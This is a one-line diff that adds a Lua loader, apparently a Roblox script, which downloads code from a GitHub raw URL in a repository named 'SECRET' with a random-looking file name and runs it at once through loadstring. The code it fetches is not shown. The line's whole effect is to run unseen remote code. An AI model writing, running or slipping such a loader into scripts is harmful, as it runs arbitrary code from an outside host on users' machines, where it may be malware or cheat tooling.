@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Baconlovecode/SECRET/refs/heads/main/QWDFGWEFIEWIJSIJFQJWJRIJDFJIWJRIJWGEWUWDQWEQ"))()
